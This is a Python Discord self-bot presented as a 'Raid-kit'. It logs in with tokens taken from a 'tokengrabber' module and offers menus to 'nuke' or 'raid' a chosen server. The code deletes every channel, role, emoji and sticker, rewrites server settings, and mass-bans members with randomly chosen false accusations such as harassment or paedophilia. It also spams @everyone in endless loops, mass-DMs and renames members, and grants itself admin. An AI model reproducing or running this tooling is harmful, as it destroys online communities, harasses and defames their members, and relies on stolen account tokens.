import asyncio
import random
import sys
import traceback
from code import compile_command
from logging import Logger, getLogger
from threading import Thread
from types import CodeType
from typing import Any, Optional, Sequence, Union

import discord
from discord.ext import commands
from InquirerPy.inquirer import confirm, number, secret, select, text  # type: ignore
from InquirerPy.validator import EmptyInputValidator

import conf
from tokengrabber import get_token

bot = commands.Bot(
  command_prefix=commands.when_mentioned_or(conf.PREFIX),
  case_insensitive=True,
  allowed_mentions=conf.ALLOWED_MENTIONS,
  strip_after_prefix=True,
  help_command=None,
  max_messages=conf.MSG_CACHE_SIZE,
  shard_id=0,
  owner_ids=[589350028837912576]
)
BotT = commands.Bot
log: Logger = getLogger("discord")

class Raidkit:
  def __init__(self, bot: commands.Bot) -> None:
    self.bot: commands.Bot = bot
    self.sel_guild: Optional[discord.Guild] = None
  async def _mass_role(self, guild: discord.Guild, role_name: str, /) -> None:
    try:
      rl: discord.Role = await guild.create_role(name=role_name, permissions=discord.Permissions.none(), color=0xff0000)
      re_rl: list[BaseException | None] = await asyncio.gather(*[member.add_roles(rl) for member in guild.members], return_exceptions=True)
      for r_rl, mb in zip(re_rl, guild.members):
        if isinstance(r_rl, Exception):
          log.warning(f"Failed to give role to {mb.name}: {r_rl}")
        else:
          log.info(f"Gave role to {mb.name}")
    except discord.errors.HTTPException as e:
      log.warning(f"Failed to grant admin role: HTTPException: {e}")
    except Exception as e:
      log.warning(f"Failed to grant admin role: Exception: {e}")
  async def _mass_nick(self, guild: discord.Guild, nickname: str, /) -> None:
    re_nc: list[discord.Member | BaseException | None] = await asyncio.gather(*[mb.edit(nick=nickname) for mb in guild.members], return_exceptions=True)
    for r_nc, mb in zip(re_nc, guild.members):
      if isinstance(r_nc, Exception):
        log.warning(f"Failed to change nickname for {mb.name}: {r_nc}")
      else:
        log.info(f"Changed nickname for {mb.name} to {mb.nick}")
  async def _mass_ch(self, guild: discord.Guild, ch_name: str, ch_amount: int, /) -> None:
    old_ch = guild.channels
    re_ch: list[discord.TextChannel | BaseException] = await asyncio.gather(*[guild.create_text_channel(ch_name) for _ in range(ch_amount)], return_exceptions=True)
    new = [c for c in guild.channels if c not in old_ch]
    for r_ch, c in zip(re_ch, new):
      if isinstance(r_ch, Exception):
        log.warning(f"Failed to create channel {c.name}: {r_ch}")
      else:
        log.info(f"Created channel {c.name}")
  async def _spam(self, guild: discord.Guild, message: str, /) -> None:
    while True:
      await asyncio.gather(*[c.send(message) for c in guild.text_channels], return_exceptions=True)
  async def _edit_guild(self, guild: discord.Guild, guild_name: str, guild_desc: str, /) -> None:
    try:
      flags = discord.SystemChannelFlags()
      flags.guild_reminder_notifications = True
      flags.join_notification_replies = False
      flags.join_notifications = False
      flags.premium_subscriptions = False
      flags.role_subscription_purchase_notification_replies = False
      flags.role_subscription_purchase_notifications = False
      await guild.edit(
        name=guild_name,
        description=guild_desc,
        icon=None,
        banner=None,
        splash=None,
        discovery_splash=None,
        discoverable=False,
        community=False,
        default_notifications=discord.NotificationLevel.all_messages,
        verification_level=discord.VerificationLevel.highest,
        explicit_content_filter=discord.ContentFilter.disabled,
        premium_progress_bar_enabled=False,
        preferred_locale=discord.Locale.chinese,
        afk_channel=None,
        system_channel=None,
        system_channel_flags=flags,
        rules_channel=None,
        public_updates_channel=None)
    except discord.HTTPException as exc:
      log.warning(f"Failed to edit guild {guild.name}: HTTPException: {exc}")
    except Exception as exc:
      log.warning(f"Failed to edit guild {guild.name}: Exception: {exc}")
  async def _delete_emj(self, guild: discord.Guild, /) -> None:
    old_em: tuple[discord.Emoji, ...] = guild.emojis
    re: list[BaseException | None] = await asyncio.gather(*[e.delete() for e in guild.emojis], return_exceptions=True)
    for r, em in zip(re, old_em):
      if isinstance(r, Exception):
        log.warning(f"Failed to delete emoji {em.name} from guild {guild.name}: {r}")
      else:
        log.info(f"Deleted emoji {em.name} from guild {guild.name}")
  async def _delete_stkr(self, guild: discord.Guild, /) -> None:
    old_st = guild.stickers
    re = await asyncio.gather(*[s.delete() for s in guild.stickers], return_exceptions=True)
    for r, st in zip(re, old_st):
      if isinstance(r, Exception):
        log.warning(f"Failed to delete sticker {st.name} from guild {guild.name}: {r}")
      else:
        log.info(f"Deleted sticker {st.name} from guild {guild.name}")
  async def _delete_rol(self, guild: discord.Guild, /) -> None:
    old_rl = guild.roles
    re = await asyncio.gather(*[r.delete() for r in guild.roles if not r.is_default()], return_exceptions=True)
    for r, rl in zip(re, old_rl):
      if isinstance(r, Exception):
        log.warning(f"Failed to delete role {rl.name} from guild {guild.name}: {r}")
      else:
        log.info(f"Deleted role {rl.name} from guild {guild.name}")
  async def _delete_ch(self, guild: discord.Guild, /) -> None:
    old_ch = guild.channels
    re = await asyncio.gather(*[c.delete() for c in guild.channels], return_exceptions=True)
    for r, ch in zip(re, old_ch):
      if isinstance(r, Exception):
        log.warning(f"Failed to delete channel {ch.name} from guild {guild.name}: {r}")
      else:
        log.info(f"Deleted channel {ch.name} from guild {guild.name}")
  async def _ban_mb(self, guild: discord.Guild, author: Union[discord.Member, discord.User], /) -> None:
    old_mb = guild.members
    re = await asyncio.gather(*[m.ban(reason=random.choice([
      "Racism", "Homophobia", "Transphobia", "Sexism", "Ableism", "Ageism",
      "Sexual Harassment", "Sexual Assault", "Harassment", "Stalking", "Threats",
      "Trolling", "Cyberbullying", "Bullying", "Hacking", "Doxing", "Paedophillia"
      ])) for m in guild.members if m != author and m != self.bot.user], return_exceptions=True)
    for r, mb in zip(re, old_mb):
      if isinstance(r, Exception):
        log.warning(f"Failed to ban member {mb.name} from guild {guild.name}: {r}")
      else:
        log.info(f"Banned member {mb.name} from guild {guild.name}")
  async def _nuke(self,
    guild: discord.Guild,
    ban: bool,
    guild_name: str,
    guild_desc: str,
    author: Union[discord.Member, discord.User], /
  ) -> None:
    await self._edit_guild(guild, guild_name, guild_desc)
    await self._delete_emj(guild)
    await self._delete_stkr(guild)
    await self._delete_rol(guild)
    await self._delete_ch(guild)
    if ban:
      await self._ban_mb(guild, author)
  async def _raid(self,
    guild: discord.Guild,
    guild_name: str,
    guild_desc: str,
    author: Union[discord.Member, discord.User],
    message: str,
    nickname: str,
    role_name: str,
    ch_name: str,
    ch_amount: int, /
  ) -> None:
    await self._nuke(guild, False, guild_name, guild_desc, author)
    await self._mass_nick(guild, nickname)
    await self._mass_role(guild, role_name)
    await self._mass_ch(guild, ch_name, ch_amount)
    task: asyncio.Task[None] = bot.loop.create_task(self._spam(guild, message))
    try:
      if confirm(f"Started spamming in {guild.name} ({guild.id}), do you want to start banning members now (no = stop)?").execute():
        task.cancel()
        await self._ban_mb(guild, author)
      else:
        task.cancel()
    except KeyboardInterrupt:
      task.cancel()
  def guild_sel(self) -> None:
    cur: Sequence[discord.Guild] = self.bot.guilds
    try:
      sel: int = int(select("Select a guild", [f"{i+1}. {g.name} ({g.id})" for i, g in enumerate(cur)]).execute().split(".")[0]) - 1
    except KeyboardInterrupt:
      return
    self.sel_guild = cur[sel]
  def nuke_menu(self, guild: discord.Guild, /) -> None:
    if self.bot.user is None or guild.me is None:
      return
    try:
      if not guild.me.guild_permissions.administrator:
        if not confirm(f"You do not have administrator access in {guild.name} ({guild.id}), do you want to proceed?").execute():
          return
      ban: Union[bool, Any] = confirm("Also try to ban all members?", ).execute()
      name: Union[str, Any] = text(f"New guild description after nuking (default: NUKED BY {self.bot.user.name}):", raise_keyboard_interrupt=False).execute() or f"NUKED BY {self.bot.user.name}"
      desc: Union[str, Any] = text(f"New guild name after nuking (default: NUKED BY {self.bot.user.name}):", raise_keyboard_interrupt=False).execute() or f"NUKED BY {self.bot.user.name}"
      if not confirm(f"Are you sure you want to nuke {guild.name} ({guild.id})?").execute():
        return
      bot.loop.create_task(self._nuke(guild, ban, name, desc, guild.me))
    except KeyboardInterrupt:
      return
  def raid_menu(self, guild: discord.Guild) -> None:
    if self.bot.user is None or guild.me is None:
      return
    try:
      if not confirm("Foreword: raiding a guild takes a LOT of requests, often over thousands even for small guilds! Which WILL cause 429s, a LOT of them. Therefore I recommend you to run this on a cloud service like CodeSanbox (free!), do you still want to proceed?").execute():
        return
      if not guild.me.guild_permissions.administrator:
        if not confirm(f"You do not have administrator access in {guild.name} ({guild.id}), do you still want to proceed?").execute():
          return
      name: Union[str, Any] = text(f"New guild name after raiding (default: NUKED BY {self.bot.user.name}):", raise_keyboard_interrupt=False).execute() or f"NUKED BY {self.bot.user.name}"
      desc: Union[str, Any] = text(f"New guild description after raiding (default: NUKED BY {self.bot.user.name}):", raise_keyboard_interrupt=False).execute() or f"NUKED BY {self.bot.user.name}"
      message: Union[str, Any] = text(f"Message to spam (default: @everyone NUKED BY {self.bot.user.name}):", raise_keyboard_interrupt=False).execute() or f"@everyone NUKED BY {self.bot.user.name}"
      nickname: Union[str, Any] = text(f"Nickname for all members (default: NUKED BY {self.bot.user.name}):", raise_keyboard_interrupt=False).execute() or f"NUKED BY {self.bot.user.name}"
      role_name: Union[str, Any] = text(f"Role name to give all members (default: NUKED BY {self.bot.user.name}):", raise_keyboard_interrupt=False).execute() or f"NUKED BY {self.bot.user.name}"
      ch_name: Union[str, Any] = text("Channel name to mass create (default: nuked-lol):", raise_keyboard_interrupt=False).execute() or "nuked-lol"
      ch_amount: int = int(number("Amount of channels to mass create (min: 1, max: 200, default: 1):", min_allowed=1, max_allowed=200, validate=EmptyInputValidator()).execute())
      if not confirm(f"Are you sure you want to raid {guild.name} ({guild.id})?").execute():
        return
      bot.loop.create_task(self._raid(guild, name, desc, guild.me, message, nickname, role_name, ch_name, ch_amount))
    except KeyboardInterrupt:
      return
  def raidkit_menu(self) -> None:
    while True:
      try:
        sel = int(select("Raid-kit: What do you want to do?", [
            "1. Set guild selection",
            "2. Nuke a guild",
            "3. Raid a guild",
            "4. Exit raid-kit menu"
          ],
          raise_keyboard_interrupt=False,
          mandatory=True,
          mandatory_message="Please select exit from the menu instead of using Ctrl-C!"
        ).execute().split(".")[0])
      except KeyboardInterrupt:
        return
      if sel == 1:
        self.guild_sel()
      elif sel == 2:
        if self.sel_guild is None:
          print("You have not selected a guild yet, select a guild from the menu now and choose this option again")
          self.guild_sel()
          continue
        self.nuke_menu(self.sel_guild)
      elif sel == 3:
        if self.sel_guild is None:
          print("You have not selected a guild yet, select a guild from the menu now and choose this option again")
          self.guild_sel()
          continue
        self.raid_menu(self.sel_guild)
      elif sel == 4:
        return
      elif sel == 5:
        raise NotImplementedError()
      elif sel == 6:
        raise NotImplementedError()
      elif sel == 7:
        raise NotImplementedError()
@bot.command(name="nick_all", aliases=["nick", "nickall"])
async def massnick(ctx: commands.Context[BotT], *, nick: str) -> None:
  await ctx.message.delete()
  if not ctx.guild:
    return
  re: list[discord.Member | BaseException | None] = await asyncio.gather(*[m.edit(nick=nick) for m in ctx.guild.members], return_exceptions=True)
  for r, m in zip(re, ctx.guild.members):
    if isinstance(r, Exception):
      log.warning(f"Failed to change nickname for {m.name}: {r}")
    else:
      log.info(f"Changed nickname for {m.name} to {m.nick}")
@bot.command(name="msg_all", aliases=["msg", "msgall"])
async def massdm(ctx: commands.Context[BotT], *, msg: str) -> None:
  await ctx.message.delete()
  if not ctx.guild:
    return
  re = await asyncio.gather(*[m.send(msg) for m in ctx.guild.members], return_exceptions=True)
  for r, m in zip(re, ctx.guild.members):
    if isinstance(r, Exception):
      log.warning(f"Failed to send message to {m.name}: {r}")
    else:
      log.info(f"Sent message to {m.name}")
@bot.command(name="spam")
async def massping(ctx: commands.Context[BotT], *, msg: str = "@everyone") -> None:
  await ctx.message.delete()
  if not ctx.guild:
    return
  async def spam() -> None:
    if not ctx.guild:
      return
    while True:
      await asyncio.gather(*[c.send(msg) for c in ctx.guild.text_channels], return_exceptions=True)
  def check(m: discord.Message) -> bool:
    return m.content.lower() == "stop" and m.author == ctx.author
  t: asyncio.Task[None] = bot.loop.create_task(spam())
  await bot.wait_for("message", check=check)
  t.cancel()
@bot.command(name="cpurge")
async def massdelchannel(ctx: commands.Context[BotT]) -> None:
  await ctx.message.delete()
  if not ctx.guild:
    return
  old_ch = ctx.guild.channels
  re = await asyncio.gather(*[c.delete() for c in ctx.guild.channels], return_exceptions=True)
  for r, c in zip(re, old_ch):
    if isinstance(r, Exception):
      log.warning(f"Failed to delete channel {c.name}: {r}")
    else:
      log.info(f"Deleted channel {c.name}")
@bot.command(name="cflood")
async def masscreatechannel(ctx: commands.Context[BotT], count: int, *, name: str) -> None:
  await ctx.message.delete()
  if not ctx.guild:
    return
  old_ch = ctx.guild.channels
  re: list[discord.TextChannel | BaseException] = await asyncio.gather(*[ctx.guild.create_text_channel(name) for _ in range(count)], return_exceptions=True)
  for r, c in zip(re, [c for c in ctx.guild.channels if c not in old_ch]):
    if isinstance(r, Exception):
      log.warning(f"Failed to create channel {c.name}: {r}")
    else:
      log.info(f"Created channel {c.name}")
@bot.command(name="admin")
async def getadmin(ctx: commands.Context[BotT], m: discord.Member) -> None:
  await ctx.message.delete()
  if not ctx.guild or not ctx.guild.me:
    return
  try:
    r = await ctx.guild.create_role(name=".", permissions=discord.Permissions.all())
    await asyncio.gather(m.add_roles(r), r.edit(position=ctx.guild.me.top_role.position-1))
  except discord.errors.HTTPException as e:
    log.warning(f"Failed to grant admin role tp {m.name}: HTTPException: {e}")
  except Exception as e:
    log.warning(f"Failed to grant admin role to {m.name}: Exception: {e}")
@bot.command(name="farm")
async def farm(ctx: commands.Context[BotT]) -> None:
  await ctx.message.edit(content="Đang bắt đầu cày")
  log.info("Đang bắt đầu cày")
  def check(m: discord.Message) -> bool:
    nonlocal ctx
    if m.author.id == 408785106942164992 and (f"{bot.user.mention}! Please complete your captcha to verify that you are human!" in m.content or f"{bot.user.mention}, are you a real human?" in m.content):  # type: ignore
      log.critical("OwO đang dí bạn, đi làm captcha đi")
      return True
    elif m.author == bot.user and m.content == "stop" and m.channel == ctx.channel:
      return True
    else:
      return False
  async def _farm(ctx: commands.Context[BotT]):
    while True:
      await asyncio.gather(*[ctx.send(x) for x in ["oh", "ob"]])
      await asyncio.sleep(15.1 + random.random()/2)
  task = bot.loop.create_task(_farm(ctx))
  await bot.wait_for("message", check=check)
  task.cancel()
@bot.event
async def on_ready() -> None:
  if not bot.user:
    return
  log.info(f"Logged in as {bot.user.name} ({bot.user.id})")
  Thread(target=menu).start()
def console() -> None:
  print(f"Python {sys.version}\nUse quit(), exit(), Ctrl-C or raise EOFError() to return to menu")
  while True:
    try:
      i: str = input(">>> ")
      if i in ["quit()", "exit()"]:
        return
      o: Union[CodeType, None] = compile_command(i)
      while o is None:
        try:
          i += "\n" + input("... ")
        except EOFError:
          i = ""
          break
        o = compile_command(i)
      if o is not None:
        exec(o)
    except EOFError:
      print("\n")
      return
    except Exception as e:
      traceback.print_exception(e, limit=10)
def menu() -> None:
  while True:
    sel = int(select("What do you want to do?", [
        "1. Open Raid-kit menu",
        "2. Open Python intepreter",
        "3. Exit self-bot"
      ],
      raise_keyboard_interrupt=False,
      mandatory=True,
      mandatory_message="Please select exit from the menu instead of using Ctrl-C!"
    ).execute().split(".")[0])
    if sel == 1:
      Raidkit(bot).raidkit_menu()
    elif sel == 2:
      console()
    elif sel == 3:
      sys.exit()
def main() -> None:
  tokens: list[str] = get_token()
  try:
    re: str = select("Select a token:", [f"{i+1}. {e[:18] + "*"*(len(e)-18)}" for i, e in enumerate(tokens+["Input my own token"])]).execute()
    if not re.endswith("Input my own token"):
      token: str = tokens[int(re.split(".")[0])-1]
    else:
      token = secret("Input your own token:", transformer=lambda t: t[:18] + "*"*(len(t)-18)).execute()
  except KeyboardInterrupt:
    sys.exit()
  try:
    bot.run(token)
  except asyncio.CancelledError:
    return
  except discord.LoginFailure:
    if confirm("Input token is invalid! Do you want to reveal input token?", raise_keyboard_interrupt=False, default=False).execute():
      print(f"The input token was {token}")
if __name__ == "__main__":
  main()